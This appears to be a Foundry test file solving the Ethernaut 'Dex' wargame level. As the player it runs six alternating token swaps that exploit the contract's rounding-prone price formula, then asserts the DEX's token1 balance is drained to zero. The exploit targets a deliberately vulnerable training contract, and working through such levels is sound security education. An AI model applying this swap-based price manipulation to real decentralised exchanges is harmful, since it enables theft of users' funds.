// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/22_Dex.sol";

contract AttackerDexTest is Test {
    Dex dex;
    SwappableToken token1;
    SwappableToken token2;
    address owner = makeAddr("owner");
    address player = makeAddr("player");

    function testDex() external {
        vm.prank(owner);
        dex = new Dex();

        vm.startPrank(address(dex));
        token1 = new SwappableToken(address(dex), "Token1", "TOK1", 100);
        token2 = new SwappableToken(address(dex), "Token2", "TOK2", 100);
        token1.transfer(player, 10);
        token2.transfer(player, 10);
        vm.stopPrank();

        vm.prank(owner);
        dex.setTokens(address(token1), address(token2));

        vm.startPrank(player);
        dex.approve(address(dex), 100);

        dex.swap(address(token1), address(token2), 10);
        dex.swap(address(token2), address(token1), 20);
        dex.swap(address(token1), address(token2), 25);
        dex.swap(address(token2), address(token1), 33);
        dex.swap(address(token1), address(token2), 49);
        dex.swap(address(token2), address(token1), 4);
        assertEq(token1.balanceOf(address(dex)), 0);
    }
}
